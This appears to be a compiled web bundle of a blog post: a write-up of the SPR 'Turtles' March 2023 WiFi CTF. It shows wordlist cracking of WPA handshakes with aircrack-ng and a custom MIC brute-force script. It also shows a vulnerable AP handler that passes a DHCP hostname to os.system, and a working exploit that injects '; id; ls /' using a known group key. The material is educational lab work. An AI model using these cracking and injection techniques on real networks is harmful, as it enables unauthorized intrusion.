"use strict";(self.webpackChunkspr_docs=self.webpackChunkspr_docs||[]).push([[6131],{26582:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>h,frontMatter:()=>s,metadata:()=>o,toc:()=>c});var a=n(85893),r=n(11151);const s={slug:"spr-turtles-march",title:"March 2023's Turtles Challenge",authors:"ltsrad",tags:["Turtles","CTF","Hacking","WiFi","Airocrack","Salsa20","WPA2"]},i=void 0,o={permalink:"/pages/blog/spr-turtles-march",source:"@site/blog/2023-05-05-turtles-march.md",title:"March 2023's Turtles Challenge",description:"Editor's note:",date:"2023-05-05T00:00:00.000Z",tags:[{inline:!0,label:"Turtles",permalink:"/pages/blog/tags/turtles"},{inline:!0,label:"CTF",permalink:"/pages/blog/tags/ctf"},{inline:!0,label:"Hacking",permalink:"/pages/blog/tags/hacking"},{inline:!0,label:"WiFi",permalink:"/pages/blog/tags/wi-fi"},{inline:!0,label:"Airocrack",permalink:"/pages/blog/tags/airocrack"},{inline:!0,label:"Salsa20",permalink:"/pages/blog/tags/salsa-20"},{inline:!0,label:"WPA2",permalink:"/pages/blog/tags/wpa-2"}],readingTime:9.065,hasTruncateMarker:!0,authors:[{name:"Alex Radocea",url:"https://twitter.com/defendtheworld",key:"ltsrad",page:null}],frontMatter:{slug:"spr-turtles-march",title:"March 2023's Turtles Challenge",authors:"ltsrad",tags:["Turtles","CTF","Hacking","WiFi","Airocrack","Salsa20","WPA2"]},unlisted:!1,prevItem:{title:"Barely AP is Almost an Access Point",permalink:"/pages/blog/barely-ap"},nextItem:{title:"January 2023's Turtles Challenge",permalink:"/pages/blog/january-2023-turtles"}},l={authorsImageUrls:[void 0]},c=[{value:"Editor&#39;s note:",id:"editors-note",level:4},{value:"Introduction",id:"introduction",level:2},{value:"Warmups",id:"warmups",level:2},{value:"Step 1",id:"step-1",level:2},{value:"Step 2",id:"step-2",level:2}];function d(e){const t={a:"a",code:"code",em:"em",h1:"h1",h2:"h2",h4:"h4",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.h4,{id:"editors-note",children:"Editor's note:"}),"\n",(0,a.jsx)(t.p,{children:"The Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills."}),"\n",(0,a.jsx)(t.p,{children:"The tasks were a bit challenging, and invovled a combination of WiFi Cracking and exploring how WPA Authentication works,\nagainst a custom Access point using Salsa20 instead of AES."}),"\n",(0,a.jsxs)(t.p,{children:[(0,a.jsx)(t.a,{href:"https://twitter.com/0vercl0k",children:"Axel Souchet"})," has kindly shared his writeup with us, which we share below."]}),"\n",(0,a.jsx)(t.h1,{id:"turtles-virtual-wifi-hacking-challenges---march-2023",children:"Turtles: Virtual WiFi Hacking Challenges - March 2023"}),"\n",(0,a.jsx)(t.h2,{id:"introduction",children:"Introduction"}),"\n",(0,a.jsx)(t.p,{children:"The older I get, the more fascinated I have become with the world surrounding me; I ask myself all the time 'how does this thing work uh \ud83e\udd14?'. It is both fun and rewarding for me to understand the world a bit better. This is also a great way to be constantly humbled by the magic that surrounds us \ud83c\udf08"}),"\n",(0,a.jsx)(t.p,{children:"Although I enjoy the process of learning how things work, there are millions of things that I interact with daily, that I know so little about; embarrassing."}),"\n",(0,a.jsxs)(t.p,{children:["Heck, how does WiFi work I thought? Because I know that I learn best by getting my hands dirty, I decided to try to solve a few challenges as an introduction. That is why I decided to check-out the March ",(0,a.jsx)(t.a,{href:"https://turtles.supernetworks.org/",children:"Turtle challenge"})," \ud83d\ude42"]}),"\n",(0,a.jsx)(t.p,{children:"If you want to play at home, you can find the challenges on Github and one the SPR website:"}),"\n",(0,a.jsxs)(t.ul,{children:["\n",(0,a.jsx)(t.li,{children:(0,a.jsx)(t.a,{href:"https://turtles.supernetworks.org/march",children:"https://turtles.supernetworks.org/march"})}),"\n",(0,a.jsx)(t.li,{children:(0,a.jsx)(t.a,{href:"https://github.com/spr-networks/turtles-march-2023",children:"https://github.com/spr-networks/turtles-march-2023"})}),"\n"]}),"\n",(0,a.jsxs)(t.p,{children:["You can participate either directly from your browser via an impressive emulated Linux environment or you can self-host the challenge by cloning the ",(0,a.jsx)(t.a,{href:"https://github.com/spr-networks/turtles-march-2023",children:"turtles-march-2023"})," repository and follow the instructions. I chose to self-host the challenges as it made it easier to debug for me."]}),"\n",(0,a.jsx)(t.h2,{id:"warmups",children:"Warmups"}),"\n",(0,a.jsxs)(t.p,{children:["All right, enough blah blah and let's get warmed up. In that part of the challenge, we are asked to extract data off two packet captures: ",(0,a.jsx)(t.code,{children:"turtle0.pcap"})," & ",(0,a.jsx)(t.code,{children:"turtle0.5.pcap"}),"."]}),"\n",(0,a.jsxs)(t.p,{children:["For the first capture, we need to extract a PSK that looks like the following: ",(0,a.jsx)(t.code,{children:"turtle{x}"}),", great. Because we don't have more details regarding the PSK's shape itself, it is fair to assume that the authors want us to use a wordlist attack instead of trying to bruteforce it."]}),"\n",(0,a.jsxs)(t.p,{children:["I grabbed the famous ",(0,a.jsx)(t.a,{href:"https://github.com/zacheller/rockyou",children:"rockyou"})," wordlist and I wrote a small Python script to format prepend / append ",(0,a.jsx)(t.code,{children:"turtle{}"})," as this is what the PSK will look like."]}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-py",children:"with open('rockyou-turtle.txt', 'w', encoding='utf8') as fout:\n    with open('rockyou.txt', 'r', encoding='utf8', errors='replace') as fin:\n        for line in fin.readlines():\n            line = line.strip()\n            fout.write(f'turtle{{{line}}}\\n')\nprint('Done')\n"})}),"\n",(0,a.jsxs)(t.p,{children:["Then, I ran ",(0,a.jsx)(t.a,{href:"https://www.aircrack-ng.org/",children:"aircrack-ng"})," with the new wordlist against ",(0,a.jsx)(t.code,{children:"turtle0.pcap"})," with the following command: ",(0,a.jsx)(t.code,{children:"$ aircrack-ng turtle0.pcap -w rockyou-turtle.txt"}),"."]}),"\n",(0,a.jsxs)(t.p,{children:["After a few minutes, a valid key was found: ",(0,a.jsx)(t.code,{children:"turtle{power}"}),", great!"]}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{children:"                        Aircrack-ng 1.6\n\n[00:00:01] 3200/2465175 keys tested (5273.73 k/s)\n\nTime left: 7 minutes, 46 seconds                           0.13%\n\n                    KEY FOUND! [ turtle{power} ]\n\n\nMaster Key     : 11 8C 23 85 2D 5F 7E AC DE 8C 85 B0 CB 80 02 5F\n                CA 48 34 DF CE 2D 2A 7C 3C 01 4B A8 14 B7 2D E1\n\nTransient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n\nEAPOL HMAC     : 6B D2 F8 71 7F E5 D8 5E 5B 68 FE 53 0A 28 9D 4E\n"})}),"\n",(0,a.jsxs)(t.p,{children:["The next challenge says that there is data to be decrypted inside ",(0,a.jsx)(t.code,{children:"turtle0.5.pcap"}),". Both the station and the AP use the ",(0,a.jsx)(t.a,{href:"https://en.wikipedia.org/wiki/IEEE_802.11i-2004",children:"4-way handshake"})," to derive various keys that are used to encrypt traffic. We cracked a PSK in the previous step, so we can  open the packet capture into ",(0,a.jsx)(t.a,{href:"https://www.wireshark.org/",children:"Wireshark"})," and let it decrypt the traffic for us. Follow Wireshark's ",(0,a.jsx)(t.a,{href:"https://wiki.wireshark.org/HowToDecrypt802.11",children:"HowToDecrypt802.11"})," article to know how to do that."]}),"\n",(0,a.jsxs)(t.p,{children:["Once decrypted, there is a ",(0,a.jsx)(t.code,{children:"PING"})," request with a flag in its payload: ",(0,a.jsx)(t.code,{children:"turtle{deecoded}"}),", awesome."]}),"\n",(0,a.jsx)(t.h2,{id:"step-1",children:"Step 1"}),"\n",(0,a.jsxs)(t.p,{children:["Okay warmups done, time to have a look at the real challenges. For this step, the authors ask for us to crack another PSK from another packet capture of a handshake. We also have the ",(0,a.jsx)(t.a,{href:"https://github.com/spr-networks/turtles-march-2023/blob/main/t1_start/turtle1-ap-pcap.py",children:"source code of a custom AP"}),"."]}),"\n",(0,a.jsxs)(t.p,{children:["I initially threw ",(0,a.jsx)(t.code,{children:"turtle1-handshake.pcap"})," at ",(0,a.jsx)(t.a,{href:"https://www.aircrack-ng.org/",children:"aircrack-ng"})," with the ",(0,a.jsx)(t.code,{children:"rockyou-turtle.txt"})," wordlist but no valid key was found, bummer. I thought it was possible that this key was part of another famous wordlist so I downloaded a bunch of them, but ... same. Weird."]}),"\n",(0,a.jsxs)(t.p,{children:["I learned more about the 4-way handshake to understand how both the station & AP derive the keys needed to transmit / verify encrypted frames. Because the handshake was captured from a custom AP, it made sense to me that maybe ",(0,a.jsx)(t.a,{href:"https://www.aircrack-ng.org/",children:"aircrack-ng"})," didn't understand the handshake properly and missed PSK."]}),"\n",(0,a.jsx)(t.p,{children:"I decided to implement the attack on my own. I used the MIC code that is sent by the AP in the 3rd message to verify if a candidate is valid or not (on top of the nonces/macs in the first / second messages). We have the entire EAPOL packet so we can compute the MIC code ourselves and verify if it matches the one sent by the AP. If it does, it means we have found a valid PSK \ud83e\udd24"}),"\n",(0,a.jsxs)(t.p,{children:["I ran the script against the ",(0,a.jsx)(t.em,{children:"turtleified"})," rockyou wordlist, and eventually (it's slow!) found a valid PSK candidate: ",(0,a.jsx)(t.code,{children:"turtle{excellent}"})," \ud83d\udd25"]}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-python",children:"# Axel '0vercl0k' Souchet - April 15 2023\n# WIN w/ b'turtle{excellent}'\nimport hashlib\nimport hmac\nfrom scapy.all import *\n\nclass EAPOL_KEY(Packet):\n    name = 'EAPOL_KEY'\n    fields_desc = [\n        ByteEnumField('key_descriptor_type', 1, {1: 'RC4', 2: 'RSN'}),\n        BitField('reserved2', 0, 2),\n        BitField('smk_message', 0, 1),\n        BitField('encrypted_key_data', 0, 1),\n        BitField('request', 0, 1),\n        BitField('error', 0, 1),\n        BitField('secure', 0, 1),\n        BitField('has_key_mic', 1, 1),\n        BitField('key_ack', 0, 1),\n        BitField('install', 0, 1),\n        BitField('key_index', 0, 2),\n        BitEnumField('key_type', 0, 1, {0: 'Group/SMK', 1: 'Pairwise'}),\n        BitEnumField('key_descriptor_type_version', 0, 3, {\n            1: 'HMAC-MD5+ARC4',\n            2: 'HMAC-SHA1-128+AES-128',\n            3: 'AES-128-CMAC+AES-128',\n            0x20: 'SALSA20-HMAC'\n        }),\n        LenField('key_length', None, 'H'),\n        LongField('key_replay_counter', 0),\n        XStrFixedLenField('key_nonce', b'\\x00'*32, 32),\n        XStrFixedLenField('key_iv', b'\\x00'*16, 16),\n        XStrFixedLenField('key_rsc', b'\\x00'*8, 8),\n        XStrFixedLenField('key_id', b'\\x00'*8, 8),\n        XStrFixedLenField('key_mic', b'\\x00'*16, 16),\n        LenField('wpa_key_length', None, 'H'),\n        ConditionalField(\n            XStrLenField('key', b'\\x00'*16,\n                         length_from=lambda pkt: pkt.wpa_key_length),\n            lambda pkt: pkt.wpa_key_length and pkt.wpa_key_length > 0)\n    ]\n\n\ndef customPRF512(key, amac, smac, anonce, snonce):\n    \"\"\"Source https://stackoverflow.com/questions/12018920/\"\"\"\n    A = b\"Pairwise key expansion\"\n    B = b\"\".join(sorted([amac, smac]) + sorted([anonce, snonce]))\n    num_bytes = 64\n    R = b''\n    for i in range((num_bytes * 8 + 159) // 160):\n        R += hmac.new(key, A + chb(0x00) + B + chb(i), hashlib.sha1).digest()\n    return R[:num_bytes]\n\ndef calc(pwd):\n    amac = bytes.fromhex('02:00:00:00:00:00'.replace(':', ''))\n    smac = bytes.fromhex('02:00:00:00:01:00'.replace(':', ''))\n    anonce = bytes.fromhex(\n        '7338c25bf9d1bba6a8dea56e87bb8b6a2e3f658be7ba8173c6ab58991e648e5f')\n    snonce = bytes.fromhex(\n        '82ce083ab0cdb46f1ae0cc94a922cdf7ca742bf130396996f92be706cca62a25')\n    PMK = hashlib.pbkdf2_hmac('sha1', pwd, b'turtle1', 4_096, 32)\n    KCK = customPRF512(PMK, amac, smac, anonce, snonce)[:16]\n    keydata = bytes.fromhex('ace914ed4b7bf2b638b81c841bd3ab67561681d57591496ff93465d173c04f911679a118fb7f9590faef7fe21aa5c82d8bc746b190ea84e1')\n    assert len(keydata) == 56\n    ek = EAPOL(version='802.1X-2004',type='EAPOL-Key') / EAPOL_KEY(\n        key_descriptor_type=2, key_descriptor_type_version=2, install=1, key_type=1, key_ack=1,\\\n        has_key_mic=1, secure=1, encrypted_key_data=1, key_replay_counter=2, \\\n        key_nonce=anonce, key_length=16, key=keydata, wpa_key_length=len(keydata)\n    )\n    return hmac.new(KCK, ek.build(), hashlib.sha1).digest()[:16]\n\ndef main():\n    wanted = bytes.fromhex('7235448e1b056108e40ff429ad3545ab')\n    assert len(wanted) == 16\n    with open('rockyou-turtle.txt', 'r', encoding='utf8') as fin:\n        for line in fin.readlines():\n            candidate = line.strip().encode()\n            c = calc(candidate)\n            assert len(c) == 16\n            if c == wanted:\n                print(f'WIN w/ {candidate}')\n                return\n    print('Done')\n\nif __name__ == '__main__':\n    main()\n"})}),"\n",(0,a.jsx)(t.h2,{id:"step-2",children:"Step 2"}),"\n",(0,a.jsxs)(t.p,{children:["All right, final step. In this step, we are given another custom ",(0,a.jsx)(t.a,{href:"https://github.com/spr-networks/turtles-march-2023/blob/main/t1_ap/turtleap/go.py",children:"AP's source code"})," and we need to break in. How exciting uh?"]}),"\n",(0,a.jsx)(t.p,{children:"For this step, I set-up an environment to debug and interact with the AP. I created a regular Hyper-V Ubuntu VM (note that this won't work from WSL2) and ran the two containers with the below commands:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-text",children:"over@bubuntu:~/turtles-march-2023$ sudo docker compose up -d\n[sudo] password for over:\nStarting t1_ap    ... done\nStarting t1_start ... done\n\nover@bubuntu:~/turtles-march-2023$ sudo ./setup.sh\n"})}),"\n",(0,a.jsx)(t.p,{children:"At that stage, you can log-in into both containers with the following commands:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-text",children:"over@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_start bash\nover@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_ap bash\n"})}),"\n",(0,a.jsxs)(t.p,{children:[(0,a.jsx)(t.code,{children:"t1_ap"})," is the container that runs the AP and ",(0,a.jsx)(t.code,{children:"t1_start"})," is where you can run a client and send packets to the AP. This is cool because you don't need any physical Wifi device to play in this environment!"]}),"\n",(0,a.jsxs)(t.p,{children:["One of the keys that is derived during the 4-way handshake is meant to be shared by every station; kind of a group key. My understanding is that it is used to send broadcast-like packets to every station. In the AP, it turns out this key is a constant: ",(0,a.jsx)(t.code,{children:"turtle{everyone gets a shell :)}"})," \ud83d\ude2c"]}),"\n",(0,a.jsxs)(t.p,{children:["After reading the code carefully, it is clear that there you don't need to be associated with the AP to send a packet encrypted with this group key. This is particularly interesting because we don't have knowledge of the PSK which means we wouldn't be able to complete the 4-way handshake. In a normal AP, the ",(0,a.jsx)(t.code,{children:"GTK"})," is shared in an encrypted frame and it isn't a constant / isn't known by an attacker (and is rotated every time a station disconnects)."]}),"\n",(0,a.jsx)(t.p,{children:"Finally, an attacker can trigger a shell command injection when the AP parses a DHCP offer packet:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-py",children:'def reply_dhcp_offer(self, incoming):\n    # ...\n    for o in incoming[DHCP].options:\n        # Log hostname for DNS revers lookup\n        if o[0] == \'hostname\':\n            cmd = "echo %s %s.lan >> hostnames.txt" % (dest_ip, o[1].decode("ascii"))\n            os.system(cmd )\n'})}),"\n",(0,a.jsxs)(t.p,{children:["At this point we have every ingredients to break into the AP and execute arbitrary shell commands by sending a specially crafted DHCP offer packet  encrypted with the GTK \ud83d\udd25; here's my code that can be run from ",(0,a.jsx)(t.code,{children:"t1_start"}),":"]}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-py",children:"# Axel '0vercl0k' Souchet - April 11 2023\nfrom scapy.all import *\nfrom salsa20 import Salsa20\nfrom itertools import count\nimport hmac\nimport hashlib\nimport struct\n\ngtk_full = b'turtle{everyone gets a shell :)}'\nGTK = gtk_full[:16]\nMIC_AP_TO_GROUP = gtk_full[16:24]\ngroup_IV = count()\n\ndef encrypt(pkt):\n  data = pkt.build()\n  pn = next(group_IV)\n  aad_calc = hmac.new(MIC_AP_TO_GROUP, data, hashlib.sha1).digest()[:16]\n  key = GTK\n  cipher = Salsa20(key, struct.pack('>Q', pn))\n  payload = cipher.encrypt(data) + aad_calc\n  pn0 = pn & 0xff\n  pn1 = (pn>>8) & 0xff\n  pn2 = (pn>>16) & 0xff\n  pn3 = (pn>>24) & 0xff\n  return Dot11CCMP(data=payload, ext_iv=1, key_id=1, PN0 = pn0, PN1=pn1, PN2=pn2, PN3=pn3)\n\ndef main():\n    # root@0c0b905e70eb:/# iw dev\n    # phy#0\n    #   Interface mon0\n    #     ifindex 2\n    #     wdev 0x2\n    #     addr 02:00:00:00:00:00\n    #     type monitor\n    #     txpower 20.00 dBm\n    #   Interface wlan0\n    #     ifindex 50\n    #     wdev 0x1\n    #     addr 02:00:00:00:00:00\n    #     type managed\n    #     txpower 20.00 dBm\n    ap = '02:00:00:00:00:00'\n    # root@29a50eeb6fb5:/x# iw dev\n    # phy#1\n    #   Interface wlan1\n    #     ifindex 51\n    #     wdev 0x100000001\n    #     addr 02:00:00:00:01:00\n    #     type managed\n    #     txpower 20.00 dBm\n    station = '02:00:00:00:01:00'\n    cmd = 'id; ls /'\n    inner_pkt = Ether(src=station) / IP() / UDP(dport=67) / BOOTP(op=1) / DHCP(options=[\n        ('hostname', f'; {cmd} #'),\n    ])\n    receiver = ap\n    sender = station\n    bssid = ap\n    pkt = RadioTap() / Dot11(addr1=receiver, addr2=sender, addr3=bssid, FCfield='to-DS+protected') / encrypt(inner_pkt)\n    pkt.show()\n    os.system('iw dev wlan1 interface add mon1 type monitor 2>/dev/null')\n    sendp(pkt, iface = 'mon1', verbose = True)\n\nif __name__ == '__main__':\n    main()\n"})}),"\n",(0,a.jsx)(t.p,{children:"Thanks again to SPR, the challenge authors for putting out free educational content, you guys rock \ud83d\udc4f\ud83c\udffd\u270a\ud83c\udffd"})]})}function h(e={}){const{wrapper:t}={...(0,r.a)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},11151:(e,t,n)=>{n.d(t,{Z:()=>o,a:()=>i});var a=n(67294);const r={},s=a.createContext(r);function i(e){const t=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),a.createElement(s.Provider,{value:t},e.children)}}}]);